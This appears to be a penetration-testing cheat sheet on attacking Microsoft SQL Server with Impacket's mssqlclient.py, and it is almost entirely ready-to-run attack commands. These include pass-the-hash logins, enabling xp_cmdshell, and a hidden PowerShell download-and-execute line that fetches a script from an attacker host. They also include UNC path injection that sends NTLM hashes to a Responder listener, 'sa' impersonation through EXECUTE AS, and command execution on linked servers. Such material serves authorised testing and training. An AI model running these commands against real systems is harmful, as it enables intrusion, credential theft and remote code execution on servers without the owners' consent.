# 07.08 mssqlclient.py MSSQL Attack Client

> Hit MSSQL with `mssqlclient.py` for `xp_cmdshell`, UNC hash capture, linked-server traversal, and EXECUTE AS impersonation.

## Overview

mssqlclient.py provides an interactive MSSQL client supporting Windows auth, SQL auth, and Kerberos. Supports xp_cmdshell, UNC path injection for hash capture, linked server traversal, and EXECUTE AS impersonation.

## Steps

- Windows auth (-windows-auth) uses NTLM or Kerberos; SQL auth is default
- enable_xp_cmdshell in shell triggers sp_configure to enable xp_cmdshell
- UNC paths trigger NTLM auth back to responder/ntlmrelayx for hash capture
- Linked servers: OPENQUERY or EXEC ... AT syntax for remote execution
- EXECUTE AS LOGIN = 'sa' for impersonation if user has IMPERSONATE permissions
- Use -k -no-pass for Kerberos auth with a valid ccache

## Commands

### Connect to MSSQL

```bash
# SQL auth:
impacket-mssqlclient user:'P@ss'@MSSQL_IP
# Windows auth:
impacket-mssqlclient DOMAIN/user:'P@ss'@MSSQL_IP -windows-auth
# PTH:
impacket-mssqlclient -hashes :NThash DOMAIN/user@MSSQL_IP -windows-auth
# Kerberos:
impacket-mssqlclient -k -no-pass DOMAIN/user@MSSQL.DOMAIN.LOCAL -windows-auth
```

### Enable xp_cmdshell and execute commands

```bash
# In mssqlclient shell:
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell "net user /domain"
SQL> xp_cmdshell "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/run.ps1')"
```

### UNC path injection — capture NetNTLMv2

```bash
# Start Responder on attacker first
responder -I tun0 -wf
# Then in mssqlclient:
SQL> EXEC master..xp_dirtree '\\ATTACKER_IP\share'
SQL> EXEC master..xp_subdirs '\\ATTACKER_IP\share'
```

### Login impersonation (EXECUTE AS)

```bash
SQL> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
SQL> EXECUTE AS LOGIN = 'sa'
SQL> SELECT SYSTEM_USER
SQL> enable_xp_cmdshell
```

### Linked server enumeration and execution

```bash
SQL> SELECT srvname, isremote FROM sysservers
SQL> EXEC sp_helplinkedsrvlogin
SQL> SELECT * FROM OPENQUERY([LINKED_SRV], 'SELECT @@version')
SQL> SELECT * FROM OPENQUERY([LINKED_SRV], 'SELECT SYSTEM_USER')
SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SRV]
SQL> EXEC ('enable_xp_cmdshell') AT [LINKED_SRV]
```
